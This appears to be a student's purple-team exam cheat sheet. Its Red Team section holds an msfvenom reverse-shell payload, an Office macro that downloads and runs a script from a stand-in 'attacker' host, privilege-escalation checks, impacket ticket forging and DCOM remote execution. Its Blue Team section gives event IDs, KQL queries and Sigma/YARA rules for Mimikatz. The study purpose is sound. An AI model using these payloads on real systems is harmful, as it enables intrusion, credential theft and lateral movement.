It's combination of [[Red Team]] and [[Blue Team]]. 

Defending tools to be familiar with: Velociraptor, IDS Tower, ELK Stack, Wazuh, Suricata IDS. It really depends so I did a little cheatsheet.

Exam deadline: **4.09.2025**


# Red Team short: 
```
#INIT ACCESS
# Phishing payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f exe > payload.exe

# Office macros
Sub AutoOpen()
    Shell "cmd.exe /c powershell -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
End Sub

#PRIV ESC
# Common checks
whoami /priv
systeminfo
net localgroup administrators

# Tools
winpeas.exe
seatbelt.exe
powerup.ps1

#LATERAL MOVEMENT (optional)
# Pass-the-Ticket
impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAIN user

# Overpass-the-Hash
impacket-getTGT domain/user:password

# DCOM execution
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
```

# Blue Team short: 
```
TOP 10 IDS:
4624 - Successful logon
4625 - Failed logon
4648 - Explicit credentials logon
4672 - Special privileges assigned
4688 - New process created
4697 - Service installed
4700 - Scheduled task enabled
4720 - User account created
4732 - Added to security group
4769 - Kerberos TGS requested
```
Critical security events to remember: 
```
// Multiple failed logons
SecurityEvent | where EventID == 4625 | where TimeGenerated >= ago(10m) 
| summarize FailedCount = count() by Account, Computer, IpAddress
| where FailedCount > 5

// New service installation
SecurityEvent | where EventID == 4697 | where TimeGenerated >= ago(1h)
```

# SIGMA rules:
```title: Mimikatz Detection
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '\mimikatz.exe'
        CommandLine|contains: 
            - 'sekurlsa::logonpasswords'
            - 'lsadump::sam'
    condition: selection
falsepositives:
    - Legitimate penetration testing
level: high
```

# YARA rules:
```
rule Mimikatz_Indicator {
    meta:
        description = "Detects Mimikatz patterns"
    strings:
        $s1 = "mimikatz" nocase
        $s2 = "sekurlsa" nocase
        $s3 = "kerberos::golden"
    condition:
        any of them
}
```
